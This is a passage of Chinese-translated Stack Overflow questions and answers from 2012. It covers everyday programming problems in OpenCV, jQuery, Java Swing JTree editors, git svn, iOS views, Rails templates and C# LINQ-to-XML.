我用谷歌搜索了很多，但找不到任何关于如何使用`matchShapes`来实现这一目标的真实示例。缺乏文档。有人可以在 C++ 中做一个小例子吗？

非常感谢！（注意我知道我可以使用 SIFT/ORB 等，但我想使用 matchShapes()）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T08:26:50.147

步骤 1：检测书的轮廓并将其存储在`vector<Point>`.

第 2 步：检测另一张图像上的轮廓。

第 3 步：迭代检测到的轮廓，并将第 1 步中检测到的形状与在另一个图像上检测到的每个轮廓相匹配。您已检测到`vector<vector<Point> >`轮廓。迭代它们，您将模型`vector<Point>`从步骤 1 和`vector<Point>`轮廓传递到`matchShape()`函数。[请在此处](https://stackoverflow.com/questions/9353810/opencv-contour-similarity?answertab=active#tab-top)查看我的答案如何使用`matchShape()`功能。

请注意，书籍在另一个图像上的形状必须与模型图像上的形状相同。它只能旋转、位移或缩放。

# javascript - 如何使用 jQuery 选择下拉列表

> ID：11735647
> 
> 赞同：-1
> 
> 时间：2012-07-31T08:02:15.160
> 
> 标签：javascript, jquery, html, dom

我有下面的下拉菜单。我想在页面加载时在下拉列表中填充橙色。我创建了一个函数 PopulateDropDown，它运行 jQuery 代码来执行此操作，但它不起作用。

```
<select name="cboFruits" id="cboFruits">
    <option value="Apple">Apple</option>
    <option value="Orange">Orange</option>
    <option value="Mango">Mango</option>
    <option value="Banana">Banana</option>
    <option value="Pine">Pine</option>
</select>

<script type="text/javascript" src ="jquery.js"></script>
<script>
    function PopulateDropDown(pFruitName)
    {
        $('cboFruits :selected').val(pFruitName);
    }

    $(document).ready(function(){
        PopulateDropDown('Orange');
    });
</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:27:22.937

好吧，您的代码存在一些问题：

```
 $('cboFruits :selected').val(pFruitName); 
```

首先，您缺少 cboFruits 前面的 #，因为 cboFruits 是您的选择列表的 ID 属性。

设置所选选项的正确方法也是这样的：

```
function PopulateDropDown(pFruitName)
{
    $('#cboFruits option:contains("'+pFruitName+'")').prop('selected', true);
}

$(document).ready(function(){   
    PopulateDropDown('Orange');
});​ 
```

参考这个问题[How do you select a specific option in a SELECT element in jQuery?](https://stackoverflow.com/questions/314636/how-do-you-select-a-particular-option-in-a-select-element-in-jquery)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:27:31.920

它应该工作：

```
function PopulateDropDown(pFruitName)
{
    $('#cboFruits').val(pFruitName);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:38:11.007

你忘了写 ** # ** 并删除**选中**

```
$('#cboFruits').val(pFruitName); 
```

**编辑 ：**

或者你使用

```
<option value="Orange" selected="true">Orange</option> 
```

当页面默认为**“橙色”**时将被选中

# java - 来自 jtree 中的 jcheckbox 的多个 ITEM_STATE_CHANGED 事件

> ID：11735650
> 
> 赞同：1
> 
> 时间：2012-07-31T08:02:35.187
> 
> 标签：java, swing, jtree, jcheckbox

有人，请解释一下，它是如何工作的。这是代码：

```
package checkboxtree;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.awt.event.MouseEvent;
import java.util.EventObject;
import java.util.Vector;

import javax.swing.AbstractCellEditor;
import javax.swing.JCheckBox;
import javax.swing.JFrame;
import javax.swing.JScrollPane;
import javax.swing.JTree;
import javax.swing.UIManager;
import javax.swing.event.ChangeEvent;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeCellRenderer;
import javax.swing.tree.TreeCellEditor;
import javax.swing.tree.TreeCellRenderer;
import javax.swing.tree.TreePath;

public class CheckBoxNodeTreeSample {
  public static void main(String args[]) {
    JFrame frame = new JFrame("CheckBox Tree");

    CheckBoxNode accessibilityOptions[] = {
        new CheckBoxNode(
            "Move system caret with focus/selection changes", false),
        new CheckBoxNode("Always expand alt text for images", true) };
    CheckBoxNode browsingOptions[] = {
        new CheckBoxNode("Notify when downloads complete", true),
        new CheckBoxNode("Disable script debugging", true),
        new CheckBoxNode("Use AutoComplete", true),
        new CheckBoxNode("Browse in a new process", false) };
    Vector accessVector = new NamedVector("Accessibility",
        accessibilityOptions);
    Vector browseVector = new NamedVector("Browsing", browsingOptions);
    Object rootNodes[] = { accessVector, browseVector };
    Vector rootVector = new NamedVector("Root", rootNodes);
    JTree tree = new JTree(rootVector);

    CheckBoxNodeRenderer renderer = new CheckBoxNodeRenderer();
    tree.setCellRenderer(renderer);

    tree.setCellEditor(new CheckBoxNodeEditor(tree));
    tree.setEditable(true);

    JScrollPane scrollPane = new JScrollPane(tree);
    frame.getContentPane().add(scrollPane, BorderLayout.CENTER);
    frame.setSize(300, 150);
    frame.setVisible(true);
  }
}

class CheckBoxNodeRenderer implements TreeCellRenderer {
  private JCheckBox leafRenderer = new JCheckBox();

  private DefaultTreeCellRenderer nonLeafRenderer = new DefaultTreeCellRenderer();

  Color selectionBorderColor, selectionForeground, selectionBackground,
      textForeground, textBackground;

  protected JCheckBox getLeafRenderer() {
    return leafRenderer;
  }

  public CheckBoxNodeRenderer() {
    Font fontValue;
    fontValue = UIManager.getFont("Tree.font");
    if (fontValue != null) {
      leafRenderer.setFont(fontValue);
    }
    Boolean booleanValue = (Boolean) UIManager
        .get("Tree.drawsFocusBorderAroundIcon");
    leafRenderer.setFocusPainted((booleanValue != null)
        && (booleanValue.booleanValue()));

    selectionBorderColor = UIManager.getColor("Tree.selectionBorderColor");
    selectionForeground = UIManager.getColor("Tree.selectionForeground");
    selectionBackground = UIManager.getColor("Tree.selectionBackground");
    textForeground = UIManager.getColor("Tree.textForeground");
    textBackground = UIManager.getColor("Tree.textBackground");
  }

  public Component getTreeCellRendererComponent(JTree tree, Object value,
      boolean selected, boolean expanded, boolean leaf, int row,
      boolean hasFocus) {

    Component returnValue;
    if (leaf) {

      String stringValue = tree.convertValueToText(value, selected,
          expanded, leaf, row, false);
      leafRenderer.setText(stringValue);
      leafRenderer.setSelected(false);

      leafRenderer.setEnabled(tree.isEnabled());

      if (selected) {
        leafRenderer.setForeground(selectionForeground);
        leafRenderer.setBackground(selectionBackground);
      } else {
        leafRenderer.setForeground(textForeground);
        leafRenderer.setBackground(textBackground);
      }

      if ((value != null) && (value instanceof DefaultMutableTreeNode)) {
        Object userObject = ((DefaultMutableTreeNode) value)
            .getUserObject();
        if (userObject instanceof CheckBoxNode) {
          CheckBoxNode node = (CheckBoxNode) userObject;
          leafRenderer.setText(node.getText());
          System.out.println("setting state");
          System.out.println(node.getText());
          System.out.println(node.isSelected());
          leafRenderer.setSelected(node.isSelected());
        }
      }
      returnValue = leafRenderer;
    } else {
      returnValue = nonLeafRenderer.getTreeCellRendererComponent(tree,
          value, selected, expanded, leaf, row, hasFocus);
    }
    return returnValue;
  }
}

class CheckBoxNodeEditor extends AbstractCellEditor implements TreeCellEditor {

  CheckBoxNodeRenderer renderer = new CheckBoxNodeRenderer();
  public static int clickCount = 0;

  ChangeEvent changeEvent = null;

  JTree tree;

  public CheckBoxNodeEditor(JTree tree) {
    this.tree = tree;
  }

  public Object getCellEditorValue() {
      System.out.println("getCellEditorValue method called!");
    JCheckBox checkbox = renderer.getLeafRenderer();
    CheckBoxNode checkBoxNode = new CheckBoxNode(checkbox.getText(),
        checkbox.isSelected());
    return checkBoxNode;
  }

  public boolean isCellEditable(EventObject event) {

      System.out.println("isCellEditable method called");

      boolean returnValue = false;
    if (event instanceof MouseEvent) {
      MouseEvent mouseEvent = (MouseEvent) event;
      TreePath path = tree.getPathForLocation(mouseEvent.getX(),
          mouseEvent.getY());
      if (path != null) {
        Object node = path.getLastPathComponent();
        if ((node != null) && (node instanceof DefaultMutableTreeNode)) {
          DefaultMutableTreeNode treeNode = (DefaultMutableTreeNode) node;
          Object userObject = treeNode.getUserObject();
          returnValue = ((treeNode.isLeaf()) && (userObject instanceof CheckBoxNode));
        }
      }
    }
    return returnValue;
  }

  public Component getTreeCellEditorComponent(JTree tree, Object value,
      boolean selected, boolean expanded, boolean leaf, int row) {

      System.out.println("getTreeCellEditorComponent method called!");

      System.out.println(String.valueOf(clickCount++));

    Component editor = renderer.getTreeCellRendererComponent(tree, value,
        true, expanded, leaf, row, true);

    // editor always selected / focused
    ItemListener itemListener = new ItemListener() {
      public void itemStateChanged(ItemEvent itemEvent) {
          JCheckBox item = (JCheckBox)itemEvent.getItem();
          System.out.println(itemEvent.paramString());
          System.out.println("item "+item.getText()+" state Changed!");

          if (stopCellEditing()) {
              fireEditingStopped();
          }
      }
    };
    if (editor instanceof JCheckBox) {
      ((JCheckBox) editor).addItemListener(itemListener);
    }

    return editor;
  }
}

class CheckBoxNode {
  String text;

  boolean selected;

  public CheckBoxNode(String text, boolean selected) {
    this.text = text;
    this.selected = selected;
  }

  public boolean isSelected() {
    return selected;
  }

  public void setSelected(boolean newValue) {
    selected = newValue;
  }

  public String getText() {
    return text;
  }

  public void setText(String newValue) {
    text = newValue;
  }

  public String toString() {
    return getClass().getName() + "[" + text + "/" + selected + "]";
  }
}

class NamedVector extends Vector {
  String name;

  public NamedVector(String name) {
    this.name = name;
  }

  public NamedVector(String name, Object elements[]) {
    this.name = name;
    for (int i = 0, n = elements.length; i < n; i++) {
      add(elements[i]);
    }
  }

  public String toString() {
    return "[" + name + "]";
  }
} 
```

这是输出：

```
isCellEditable method called
getTreeCellEditorComponent method called!
0
setting state
Use AutoComplete
true
ITEM_STATE_CHANGED,item=javax.swing.JCheckBox[,40,84,129x24,alignmentX=0.0,alignmentY=0.5,border=javax.swing.plaf.BorderUIResource$CompoundBorderUIResource@b179c3,flags=296,maximumSize=,minimumSize=,preferredSize=,defaultIcon=,disabledIcon=,disabledSelectedIcon=,margin=javax.swing.plaf.InsetsUIResource[top=2,left=2,bottom=2,right=2],paintBorder=false,paintFocus=false,pressedIcon=,rolloverEnabled=true,rolloverIcon=,rolloverSelectedIcon=,selectedIcon=,text=Use AutoComplete],stateChange=DESELECTED
item Use AutoComplete state Changed!
getCellEditorValue method called!
setting state
Use AutoComplete
false
setting state
Use AutoComplete
false
setting state
Use AutoComplete
false

isCellEditable method called
getTreeCellEditorComponent method called!
1
setting state
Use AutoComplete
false
ITEM_STATE_CHANGED,item=javax.swing.JCheckBox[,40,84,129x24,alignmentX=0.0,alignmentY=0.5,border=javax.swing.plaf.BorderUIResource$CompoundBorderUIResource@b179c3,flags=296,maximumSize=,minimumSize=,preferredSize=,defaultIcon=,disabledIcon=,disabledSelectedIcon=,margin=javax.swing.plaf.InsetsUIResource[top=2,left=2,bottom=2,right=2],paintBorder=false,paintFocus=false,pressedIcon=,rolloverEnabled=true,rolloverIcon=,rolloverSelectedIcon=,selectedIcon=,text=Use AutoComplete],stateChange=SELECTED
item Use AutoComplete state Changed!
getCellEditorValue method called!
setting state
Use AutoComplete
true
ITEM_STATE_CHANGED,item=javax.swing.JCheckBox[,40,84,129x24,invalid,alignmentX=0.0,alignmentY=0.5,border=javax.swing.plaf.BorderUIResource$CompoundBorderUIResource@b179c3,flags=296,maximumSize=,minimumSize=,preferredSize=,defaultIcon=,disabledIcon=,disabledSelectedIcon=,margin=javax.swing.plaf.InsetsUIResource[top=2,left=2,bottom=2,right=2],paintBorder=false,paintFocus=false,pressedIcon=,rolloverEnabled=true,rolloverIcon=,rolloverSelectedIcon=,selectedIcon=,text=Use AutoComplete],stateChange=SELECTED
item Use AutoComplete state Changed!
setting state
Use AutoComplete
true
setting state
Use AutoComplete
true

isCellEditable method called
getTreeCellEditorComponent method called!
2
ITEM_STATE_CHANGED,item=javax.swing.JCheckBox[,40,84,129x24,invalid,alignmentX=0.0,alignmentY=0.5,border=javax.swing.plaf.BorderUIResource$CompoundBorderUIResource@b179c3,flags=296,maximumSize=,minimumSize=,preferredSize=,defaultIcon=,disabledIcon=,disabledSelectedIcon=,margin=javax.swing.plaf.InsetsUIResource[top=2,left=2,bottom=2,right=2],paintBorder=false,paintFocus=false,pressedIcon=,rolloverEnabled=true,rolloverIcon=,rolloverSelectedIcon=,selectedIcon=,text=checkboxtree.CheckBoxNode[Use AutoComplete/true]],stateChange=DESELECTED
item checkboxtree.CheckBoxNode[Use AutoComplete/true] state Changed!
ITEM_STATE_CHANGED,item=javax.swing.JCheckBox[,40,84,129x24,invalid,alignmentX=0.0,alignmentY=0.5,border=javax.swing.plaf.BorderUIResource$CompoundBorderUIResource@b179c3,flags=296,maximumSize=,minimumSize=,preferredSize=,defaultIcon=,disabledIcon=,disabledSelectedIcon=,margin=javax.swing.plaf.InsetsUIResource[top=2,left=2,bottom=2,right=2],paintBorder=false,paintFocus=false,pressedIcon=,rolloverEnabled=true,rolloverIcon=,rolloverSelectedIcon=,selectedIcon=,text=checkboxtree.CheckBoxNode[Use AutoComplete/true]],stateChange=DESELECTED
item checkboxtree.CheckBoxNode[Use AutoComplete/true] state Changed!
setting state
Use AutoComplete
true
ITEM_STATE_CHANGED,item=javax.swing.JCheckBox[,40,84,129x24,invalid,alignmentX=0.0,alignmentY=0.5,border=javax.swing.plaf.BorderUIResource$CompoundBorderUIResource@b179c3,flags=296,maximumSize=,minimumSize=,preferredSize=,defaultIcon=,disabledIcon=,disabledSelectedIcon=,margin=javax.swing.plaf.InsetsUIResource[top=2,left=2,bottom=2,right=2],paintBorder=false,paintFocus=false,pressedIcon=,rolloverEnabled=true,rolloverIcon=,rolloverSelectedIcon=,selectedIcon=,text=Use AutoComplete],stateChange=SELECTED
item Use AutoComplete state Changed!
ITEM_STATE_CHANGED,item=javax.swing.JCheckBox[,40,84,129x24,invalid,alignmentX=0.0,alignmentY=0.5,border=javax.swing.plaf.BorderUIResource$CompoundBorderUIResource@b179c3,flags=296,maximumSize=,minimumSize=,preferredSize=,defaultIcon=,disabledIcon=,disabledSelectedIcon=,margin=javax.swing.plaf.InsetsUIResource[top=2,left=2,bottom=2,right=2],paintBorder=false,paintFocus=false,pressedIcon=,rolloverEnabled=true,rolloverIcon=,rolloverSelectedIcon=,selectedIcon=,text=Use AutoComplete],stateChange=SELECTED
item Use AutoComplete state Changed!
ITEM_STATE_CHANGED,item=javax.swing.JCheckBox[,40,84,129x24,alignmentX=0.0,alignmentY=0.5,border=javax.swing.plaf.BorderUIResource$CompoundBorderUIResource@b179c3,flags=296,maximumSize=,minimumSize=,preferredSize=,defaultIcon=,disabledIcon=,disabledSelectedIcon=,margin=javax.swing.plaf.InsetsUIResource[top=2,left=2,bottom=2,right=2],paintBorder=false,paintFocus=false,pressedIcon=,rolloverEnabled=true,rolloverIcon=,rolloverSelectedIcon=,selectedIcon=,text=Use AutoComplete],stateChange=DESELECTED
item Use AutoComplete state Changed!
getCellEditorValue method called!
setting state
Use AutoComplete
false
ITEM_STATE_CHANGED,item=javax.swing.JCheckBox[,40,84,129x24,invalid,alignmentX=0.0,alignmentY=0.5,border=javax.swing.plaf.BorderUIResource$CompoundBorderUIResource@b179c3,flags=296,maximumSize=,minimumSize=,preferredSize=,defaultIcon=,disabledIcon=,disabledSelectedIcon=,margin=javax.swing.plaf.InsetsUIResource[top=2,left=2,bottom=2,right=2],paintBorder=false,paintFocus=false,pressedIcon=,rolloverEnabled=true,rolloverIcon=,rolloverSelectedIcon=,selectedIcon=,text=Use AutoComplete],stateChange=DESELECTED
item Use AutoComplete state Changed!
ITEM_STATE_CHANGED,item=javax.swing.JCheckBox[,40,84,129x24,invalid,alignmentX=0.0,alignmentY=0.5,border=javax.swing.plaf.BorderUIResource$CompoundBorderUIResource@b179c3,flags=296,maximumSize=,minimumSize=,preferredSize=,defaultIcon=,disabledIcon=,disabledSelectedIcon=,margin=javax.swing.plaf.InsetsUIResource[top=2,left=2,bottom=2,right=2],paintBorder=false,paintFocus=false,pressedIcon=,rolloverEnabled=true,rolloverIcon=,rolloverSelectedIcon=,selectedIcon=,text=Use AutoComplete],stateChange=DESELECTED
item Use AutoComplete state Changed!
setting state
Use AutoComplete
false
setting state
Use AutoComplete
false 
```

我不明白为什么在方法***getCellEditorValue***之后调用方法***getTreeCellRendererComponent 三次***。

以及为什么当我单击它时***JCheckbox 会***生成如此多的**ITEM_STATE_CHANGED事件。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:17:22.327

至于渲染器：

*   对 getTreeCellRendererComponent 的调用次数是不可控的（只要内部绘制机制认为有必要，它就会在整个树中使用）

至于编辑：

*   您在每次调用 getTreeCellEditorComponent 时都创建并注册了一个新的侦听器...所有人都会在更改选择状态时收到通知
*   在更改选择时调用 itemListener 两次（分别用于选择/取消选择）
*   选择状态的初始设置也可能会触发两次，因此每个侦听器的每次点击总共有 4 个事件
*   停止编辑的逻辑有点过多：调用 super.stopCellEditing 已经触发了 editingStopped :-)

您可能会考虑使用 ActionListener 而不是 ItemListener。

# git - git svn dcommit 与不同的用户

> ID：11735652
> 
> 赞同：2
> 
> 时间：2012-07-31T08:02:45.047
> 
> 标签：git, git-svn, msysgit

我尝试`git svn dcommit`使用选项使用不同的 svn 用户名执行`--username`，但它没有帮助。提交被创作为默认用户（我用来克隆 svn 存储库的用户）。

是否可以`git svn dcommit`使用特定的 svn 用户执行？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2018-11-06T15:16:23.513

我通过“作为另一个用户”运行 git 来做到这一点：

1.  我用命令创建了一个批处理文件`git svn dcommit`
2.  我将批处理文件保存在 c:\
3.  我按`Shift`+右键单击批处理文件，“以不同用户身份运行”
4.  提供其他用户凭据
5.  提交是由“不同的用户”完成的

# objective-c - iPhone：更改 UITableView 单元格的绘制顺序

> ID：11735654
> 
> 赞同：1
> 
> 时间：2012-07-31T08:02:47.917
> 
> 标签：objective-c, ios, uitableview

我需要按 z 轴更改绘制顺序，因此中间单元始终位于顶部。任何人都知道任何让我改变重绘顺序的方法吗？

我现在拥有的（白行设置为选中并显示哪个是中间的（应该在 z 轴的顶部））：

![在此处输入图像描述](../Images/c5faeddd095a25e3b5cc08ebfa4cb3fd.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:21:25.180

我自己找到了解决方案。只是要求`[mTableView bringSubviewToFront:cell];`中间排，它工作正常。我之前没有尝试过，因为在android上它不起作用。我不得不更改绘制顺序（android sdk 对此有保护方法）。

希望这对某人有帮助

# javascript - 我们可以使用 Accordion 页面类型在页面加载之前隐藏所有数据吗？

> ID：11735655
> 
> 赞同：0
> 
> 时间：2012-07-31T08:02:51.370
> 
> 标签：javascript, jquery

在下面给出的链接中，当我们刷新页面时，它会在其自行折叠之前简要显示扩展版本。有没有办法让它立即崩溃？

[http://new.cgwealth.com/staff](http://new.cgwealth.com/staff)

以下是 JS 代码链接： [http://new.cgwealth.com/pages/js/jquery-1.7.2.min.js](http://new.cgwealth.com/pages/js/jquery-1.7.2.min.js)
[http://new.cgwealth.com/pages/js/accordion-jquery-ui.min .js](http://new.cgwealth.com/pages/js/accordion-jquery-ui.min.js)

```
 <script type="text/Javascript">
        $(document).ready(function () {
            $(".accordion").accordion({
                autoHeight: false,
                navigation: false,
                collapsible: true,
                clearStyle: true
            });
        });
     </script> 
```

CSS 链接： http: [//new.cgwealth.com/pages/pages/css/accordion.css](http://new.cgwealth.com/pages/pages/css/accordion.css)

所以我想隐藏所有数据，直到我的手风琴功能起作用。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:23:33.603

我在上一个项目中也有同样的问题，但我对此一无所知。然后我用一个非常丑陋的方法来解决这个问题。当我从服务器加载数据时，我添加了名为“hidden”（css：display：none）的类，它努力让所有数据，就像文本或图像一样，都隐藏起来。在加载所有数据之后，我调用 jquery 函数手风琴并删除类“隐藏”。所以我用这个方法来修复。也许它对你有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:14:09.693

您必须通过 css 隐藏内容，然后才能通过 javascript 显示内容。这是一份工作副本

[http://jsfiddle.net/aneeshrajvj/FcHEC/](http://jsfiddle.net/aneeshrajvj/FcHEC/)

# android - Android RSS 提要不可点击

> ID：11735659
> 
> 赞同：0
> 
> 时间：2012-07-31T08:03:02.557
> 
> 标签：android, rss

我正在开发一个显示来自网站的 RSS 提要的 Android 应用程序，所以我从这个[网站](http://www.warriorpoint.com/blog/2009/07/19/android-simplified-source-code-for-parsing-and-working-with-xml-data-and-web-services-in-android/)下载了一个教程，它包含所有代码片段。它对我很有用..但是当我更改我想要我的提要的网站的 URL 时.. 我得到了新的提要，但我无法单击它们以获取详细信息，这与本教程中默认 URL 中的提要不同.

知道我该如何解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:12:42.920

检查两个xml之间的区别。

# javascript - 多个复选框值将显示在文本框中

> ID：11735660
> 
> 赞同：3
> 
> 时间：2012-07-31T08:03:04.017
> 
> 标签：javascript, jquery

这是我的代码：

```
<body>
<div align="center">
<b>A<input type="checkbox" name="a" id="check" value="a"></b>
<b>B<input type="checkbox" name="b" id="check" value="a"></b>
<b>B<input type="checkbox" name="c" id="check" value="c"></b>
<b>D<input type="checkbox" name="d" id="check" value="d"></b>
</div>
<table align="center">
<tr>
<td>Text:</td>
<td><input type="text" name="text" id="text"></td>
</tr>
</table>
</body> 
```

我正在尝试：如果（多个）复选框被选中（或选中），该值将被分配到复选框中，如“abcd”或“acd”或“bd”。为此，我编写了 jQuery

```
<script type="text/javascript">
$(document).click(function(){
if($("#check").attr('checked')){
    $("#text").val(("#check").val());
}
});
</script> 
```

能够一次打印一个 txtbox 值，但不能一次将所有检查值放入文本框中。我哪里出错了？？任何输入将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T08:07:09.823

我可能没有正确理解你，但是这个小提琴对你有帮助吗？[http://jsfiddle.net/XwGJ9/1/](http://jsfiddle.net/XwGJ9/1/)

变化是javascript：

```
var $textInput = $('#text');
var $checkBox = $('#checkboxes');

$('input').click(function(){
    populateTextInput();
});

function populateTextInput () {
    // empty text input
    $textInput.val('');

    // print out all checked inputs
    $checkBox.find('input:checked').each(function() {
        $textInput.val( $textInput.val() + $(this).val() );
    });
} 
```

编辑：更新

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T08:13:05.697

使用此代码

```
$('.check').click(function(){
    $("#text").val('');
    $(".check").each(function(){
        if($(this).prop('checked')){

            $("#text").val($("#text").val()+$(this).val());
        }
    });
});​ 
```

​</p>

使用此 HTML（使用`class`而不是`id`for abcd）

```
<div align="center">
<b>A<input type="checkbox" name="a" class="check" value="a"></b>
<b>B<input type="checkbox" name="b" class="check" value="b"></b>
<b>B<input type="checkbox" name="c" class="check" value="c"></b>
<b>D<input type="checkbox" name="d" class="check" value="d"></b>
</div>
<table align="center">
<tr>
<td>Text:</td>
<td><input type="text" name="text" id="text"></td>
</tr>
</table>​ 
```

我也鼓励使用 CSS 而不是`align="center"`

[**观看现场运行的演示**](http://jsfiddle.net/aLLx9/1/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T08:08:00.787

因此，我认为您希望将这些值一起附加到文本框中。在这种情况下，请执行以下操作：

```
<script type="text/javascript">
$(document).click(function(){
if($("#check").attr('checked')){
    var textBoxVal = $("#text").val()+$("#check").val(); // Concatenate the existing textbox value with the checkbox value.
    // Load the resulting value into new var textBoxVal.
    $("#text").val(textBoxVal); // Load the new value into the textbox.
}
});
</script> 
```

我使用原生 JS 只是为了更清楚地说明我在做什么。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-31T08:11:22.097

用过这样的东西..可能会帮助你

```
var checkeditems = $('input:checkbox[name="check[]"]:checked')
                          .map(function() {
                                return $(this).val()
                           })
                            .get()
                            .join(","); 

 $("#text").val(checkeditems); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-31T09:49:52.350

如果您一次不想要 a、b、c、d 的倍数，则 onclick 是每个复选框

```
 var boxes = $("input:checkbox");
        boxes.each(function(idx,elem){
                elem.onclick=function(event){
                    var choices = "";
                    boxes.each(function(idx,elem){
                        choices += elem.checked ? elem.name:"";
                    });
                    $('#text').val(choices);
                }
        }); 
```

# ruby-on-rails - 自定义数组在 rails 视图中显示不佳

> ID：11735669
> 
> 赞同：1
> 
> 时间：2012-07-31T08:03:35.173
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3

我有一个自定义的字符串 url 数组，我将其添加到 image_tag 中，如下所示：

```
<%=  @attachment.each do |att| %>
<div>
    <%= image_tag att %>
</div>

<% end %> 
```

图像显示正确，但我在图像下方得到以下垃圾：

["http://localhost:8090/download/attachments/884794/DSC_0006.NEF?version=1&modificationDate=1343685834627", "http://localhost:8090/download/attachments/885137/Sunflower.gif?version=1&modificationDate= 1343720588175", "http://localhost:8090/download/attachments/885140/Spiked.gif?version=1&modificationDate=1343720548736"]

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:07:06.310

将第一个标记更改为 <% 而不是 <%=。equals 打印 .each 的垃圾返回值。

# jquery - 如何使用 Javascript 或 jQuery 在 IE8,9 中获取上传文件的大小？

> ID：11735671
> 
> 赞同：4
> 
> 时间：2012-07-31T08:03:38.653
> 
> 标签：jquery

我已经尝试了很多，但没有找到任何方法来解决我的问题。

如何在 IE8,9 中获取上传文件的大小？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-02-15T06:08:10.137

您将需要使用 Active X，因为这些版本的 IE 不支持 HTML5 File API。我在网上找到了一个代码片段。

```
function getSize()
{
    var myFSO = new ActiveXObject("Scripting.FileSystemObject");
    var filepath = document.upload.file.value;
    var thefile = myFSO.getFile(filepath);
    var size = thefile.size;
    alert(size + " bytes");
} 
```

有关详细信息，请参阅[此](http://www.kavoir.com/2009/01/check-for-file-size-with-javascript-before-uploading.html)。另请查看 IE 的 API 参考中的备注部分，用于 |input type=file| [在这里](http://msdn.microsoft.com/en-us/library/ie/ms535263%28v=vs.85%29.aspx)。

# c# - 如何使用 Linq Lambda 检索 XML？

> ID：11735673
> 
> 赞同：2
> 
> 时间：2012-07-31T08:03:47.640
> 
> 标签：c#, asp.net, linq, lambda

当 Databind() 调用时，它会在新客户处产生错误。请仅通过带有 lambda 的 linq 解决它。

错误 ：

*你调用的对象是空的*

```
IEnumerable<Customers> Customers = XDocument.Load("Customers.xml")
    .Descendants("Customer")
        .Select(x => new Customers
        {
            Name = x.Element("Name").Value,
            City = x.Element("City").Value,
            Contact = x.Element("Contact").Value
        });

grid.DataSource = Customers;
grid.DataBind();

public class Customers
{
    public Customers() { }
    public string Name { get; set; }
    public string City { get; set; }
    public string Contact { get; set; }
} 
```

XML：

```
 <?xml version="1.0" encoding="utf-8"?>
<Customers>
    <Customer>
        <Name>John</Name>
        <City>Ney York</City>
        <Contact>2233</Contact>
    </Customer>
    <Customer>
        <Name>Albert</Name>
        <City>Sydney</City>
        <Contact>4455</Contact>
    </Customer>
    <Customer>
        <Name>David</Name>
        <City>Colombo</City>
        <Contact>6677</Contact>
    </Customer>
    <Customer>
        <Name>George</Name>
        <City>London</City>
        <Contact>8899</Contact>
    </Customer>
</Customers> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-31T08:19:48.080

试试这个..

```
IEnumerable<Customers> Customers = XDocument.Load("Customers.xml").Element("Customers")
  .Descendants("Customer")
    .Select(x => new Customers
    {
        Name = x.Element("Name").Value,
        City = x.Element("City").Value,
        Address = x.Element("Address").Value
    }); 
```

希望这项工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:05:44.940

用's'与客户一起修改

```
 List<Customers> data =   XDocument.Load("Customers.xml").Descendants("Customers")
                                    .Select(x => new Customers
                                        {
                                            Name = x.Element("Name").Value,
                                            City = x.Element("City").Value,
                                            Address = x.Element("Address").Value
                                        }).ToList(); 
```

# ios - 如何计算两点之间的角度并旋转uiview以品脱到这两点？

> ID：11735676
> 
> 赞同：1
> 
> 时间：2012-07-31T08:03:59.867
> 
> 标签：ios, xcode

我在一个 UIView 类的 drawRect 方法中制作了一个箭头长度固定的尖箭头。我必须计算 ArrowView 的中心和旋转角度，然后将其添加到我的视图中，以使箭头看起来从源指向目标。

我使用的代码是

```
-(void)addArrowForChessMove:(CGPoint)source andDestination:(CGPoint)destination
{

    CGPoint centerOfArrow=CGPointMake((abs(source.x+destination.x)/2), (abs(source.y+destination.y)/2));

    DrawExperiment *drw=[[DrawExperiment alloc]initWithArrowHeight:70];
    drw.frame=CGRectMake(0,0, 25, 70);
    [drw setCenter:centerOfArrow];
    [drw setBackgroundColor:[UIColor clearColor]];
    [drw setTag:1002];

    float angleVal = atan2((destination.x - source.x) , (destination.y - source.y))*180/M_PI;
if ((destination.y -source.y) > 0) 
    {
        if((destination.x - source.x)<0)
        {
            angleVal= angleVal+M_PI_2;
        }
                 NSLog(@"%f====%f",(destination.y -source.y),(destination.x - source.x));

    }
    else if ((destination.y -source.y) < 0) 
    {
        if((destination.x - source.x)<0)
        {
            angleVal=angleVal+M_PI_2;
        }
        else{
            NSLog(@"%f====%f",(destination.y -source.y),(destination.x - source.x));
            angleVal= angleVal+M_PI;
        }

    }
    else if ((destination.x - source.x) < 0) 
    {
        if((destination.y -source.y)>=0)
        {
            angleVal= angleVal+M_PI;
        }
        else
        {
         NSLog(@"%f====%f",(destination.y -source.y),(destination.x - source.x));
        angleVal= M_PI;
        }
    }
    drw.transform=CGAffineTransformMakeRotation(angleVal);
    [self.view addSubview:drw];
    [self.view bringSubviewToFront:[self.view viewWithTag:1002]];

}` 
```

` 该代码适用于水平或垂直轴，但是当点的角度不是 90 的倍数时，结果是相反的时间。

我错过了什么……谢谢

我已经添加了调整代码，因为箭头可以在任何方向它已经解决了很多问题，但仍然存在 45 度和 135 度的问题......

